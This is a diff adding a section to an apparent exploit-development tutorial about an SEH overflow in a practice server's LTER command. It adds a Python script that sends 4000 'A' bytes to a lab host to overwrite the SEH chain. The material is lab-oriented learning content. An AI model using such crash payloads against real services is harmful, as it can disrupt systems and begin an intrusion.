@@ -215,6 +215,33 @@ Again, this exploit methodology is largely the same as Doyler's as I leaned on h
 
 We will pick up at the SEH overwrite which is where we left off in the last post. We know we're restricted to alphanumeric shellcode. Let's overflow the SEH components and then find our offsets with Mona. 
 
+If we send our `A` value buffer we overwrite both 4 byte components of the SEH chain. 
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+buffer = 'A' * 4000
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
+![](/assets/images/CTP/LTERsehoverwrite.JPG)
+
+
+
+
+
 ![](/assets/images/CTP/LTERseh.JPG)
 
 
